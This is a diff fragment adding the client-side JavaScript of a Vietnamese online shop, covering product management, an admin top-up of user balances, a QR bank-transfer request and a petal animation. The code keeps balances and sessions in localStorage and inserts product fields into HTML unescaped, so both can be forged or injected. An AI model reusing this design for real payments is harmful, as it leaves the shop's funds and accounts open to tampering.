+<input value="${p.download || ''}" class="admin-input text-xs flex-1 min-w-[100px]" placeholder="Link tải" onchange="updateProduct(${p.id},'download',this.value)"/>
+<input value="${p.video || ''}" class="admin-input text-xs flex-1 min-w-[100px]" placeholder="Link video" onchange="updateProduct(${p.id},'video',this.value)"/>
+<button onclick="deleteProduct(${p.id})" class="text-red-400 text-xs hover:text-red-300 transition hover:scale-110">🗑️</button>
+</div>
+`).join('');
+}
+
+function updateProduct(id, field, value) {
+products = loadProducts();
+const p = products.find(item => item.id === id);
+if (p) { 
+if (field === 'price' || field === 'stock') {
+p[field] = parseInt(value) || 0;
+} else {
+p[field] = value; 
+}
+saveProducts(products); 
+renderProducts(); 
+}
+}
+
+function deleteProduct(id) {
+if (!confirm('Xóa sản phẩm?')) return;
+products = loadProducts();
+products = products.filter(p => p.id !== id);
+saveProducts(products);
+renderProducts();
+renderAdmin();
+toast('Đã xóa sản phẩm');
+}
+
+function addProduct() {
+const name = document.getElementById('new-name').value.trim();
+const price = parseInt(document.getElementById('new-price').value);
+const stock = parseInt(document.getElementById('new-stock').value);
+const image = document.getElementById('new-image').value.trim() || 'https://i.imgur.com/placeholder.jpg';
+const download = document.getElementById('new-download').value.trim() || 'https://tykuio.store/download.zip';
+const video = document.getElementById('new-video').value.trim() || 'https://youtube.com';
+
+if (!name) { toast('❌ Vui lòng nhập tên sản phẩm'); return; }
+if (isNaN(price)) { toast('❌ Vui lòng nhập giá hợp lệ (0 = Miễn phí)'); return; }
+if (isNaN(stock) || stock < 0) { toast('❌ Vui lòng nhập số lượng hợp lệ'); return; }
+
+products = loadProducts();
+products.push({ 
+id: Date.now(), 
+name, 
+price, 
+stock, 
+sold: 0, 
+image, 
+download, 
+video 
+});
+saveProducts(products);
+['new-name','new-price','new-stock','new-image','new-download','new-video'].forEach(id => document.getElementById(id).value = '');
+renderProducts();
+renderAdmin();
+toast('✅ Đã thêm sản phẩm thành công!');
+}
+
+// ============================================================
+// ADMIN TOPUP
+// ============================================================
+function adminTopup(username) {
+const amount = parseInt(document.getElementById(`admin-topup-${username}`).value);
+if (!amount || amount < 10000) { toast('Số tiền tối thiểu 10.000đ'); return; }
+if (amount > 1000000000) { toast('Số tiền tối đa 1.000.000.000đ'); return; }
+
+const users = loadUsers();
+const user = users.find(u => u.username === username);
+if (!user) { toast('Không tìm thấy user'); return; }
+
+user.balance = (user.balance || 0) + amount;
+if (!user.topups) user.topups = [];
+user.topups.unshift({ method: 'Admin nạp', amount, time: new Date().toLocaleString('vi-VN'), status: 'Thành công' });
+saveUsers(users);
+
+if (session && session.username === username) {
+session = user;
+localStorage.setItem('tykuio_session', JSON.stringify(session));
+updateNav();
+}
+
+renderAdmin();
+toast(`✅ Đã nạp ${amount.toLocaleString()}đ cho ${username}`);
+}
+
+// ============================================================
+// GỬI YÊU CẦU NẠP TIỀN
+// ============================================================
+function requestTopup() {
+const saved = localStorage.getItem('tykuio_session');
+if (!saved) { toast('Vui lòng đăng nhập'); return; }
+try { session = JSON.parse(saved); } catch(e) { toast('Lỗi session'); return; }
+
+const amount = parseInt(document.getElementById('topup-amount').value);
+if (!amount || amount < 10000) { toast('Số tiền tối thiểu 10.000đ'); return; }
+if (amount > 1000000000) { toast('Số tiền tối đa 1.000.000.000đ'); return; }
+
+const memo = `TykuioStore_${session.username}`;
+const area = document.getElementById('qr-topup-area');
+area.classList.remove('hidden');
+
+document.getElementById('topup-memo').textContent = `Nội dung: ${memo}`;
+document.getElementById('topup-display-amount').textContent = `${amount.toLocaleString()}đ`;
+
+const qrImg = document.getElementById('qr-topup-image');
+qrImg.src = `https://i.imgur.com/YHIjSeF.jpeg?t=${Date.now()}`;
+
+toast('✅ Đã tạo QR! Vui lòng chuyển khoản và chờ Admin duyệt.');
+}
+
+// ============================================================
+// KHỞI TẠO - CÓ LOADING
+// ============================================================
+(function init() {
+// Ẩn loader sau khi tải
+const loader = document.getElementById('loader');
+const body = document.body;
+
+// Tạo hoa anh đào
+const container = document.getElementById('cherry-container');
+for (let i = 0; i < 50; i++) {
+const petal = document.createElement('div');
+petal.className = 'petal';
+petal.style.left = Math.random() * 100 + 'vw';
+petal.style.width = (Math.random() * 10 + 5) + 'px';
+petal.style.height = (Math.random() * 10 + 5) + 'px';
+petal.style.animationDuration = (Math.random() * 4 + 6) + 's';
+petal.style.animationDelay = (Math.random() * 6) + 's';
+petal.style.opacity = Math.random() * 0.5 + 0.2;
+container.appendChild(petal);
+}
+
+// Load dữ liệu
+const saved = localStorage.getItem('tykuio_session');
+if (saved) {
+try { session = JSON.parse(saved); } catch(e) {}
+}
+updateNav();
+loadProducts();
+renderProducts();
+renderHistory();
+lucide.createIcons();
+
+// Ẩn loader sau khi mọi thứ sẵn sàng
+setTimeout(() => {
+loader.classList.add('hidden');
+body.classList.add('loaded');
+}, 400);
+})();
+</script>
+
+</body>
+</html>
